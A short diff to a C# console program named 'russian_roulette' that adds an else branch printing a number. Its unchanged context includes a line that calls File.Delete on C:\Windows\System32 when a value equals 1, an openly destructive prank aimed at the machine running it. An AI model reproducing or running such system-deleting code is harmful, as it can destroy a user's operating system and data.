@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -16,6 +16,10 @@ namespace russian_roulette
             if (i == 1)
             {
                 File.Delete(@"C:\Windows\System32");
+            }
+            else
+            {
+                Console.WriteLine("" + i);
             }
             Console.ReadKey();
         }
